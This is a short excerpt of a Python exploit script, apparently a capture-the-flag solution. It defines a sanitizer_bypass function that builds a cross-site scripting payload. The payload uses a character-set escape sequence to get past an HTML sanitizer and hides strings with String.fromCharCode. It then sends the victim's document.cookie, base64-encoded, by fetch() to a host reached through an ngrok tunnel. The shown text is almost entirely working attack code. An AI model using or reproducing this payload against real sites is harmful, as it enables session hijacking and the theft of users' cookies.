...
NGROK_HOST = "127.0.0.1:1337" # ngrok http 1337
...
def sanitizer_bypass():
    ...
    payload = f"\x1b\x28\x4a\"[0]=String.fromCharCode({','.join(str(ord(c)) for c in NGROK_HOST+'/wait')});fetch(String.fromCharCode({','.join(str(ord(c)) for c in url)})+btoa(document.cookie));//"
    return payload
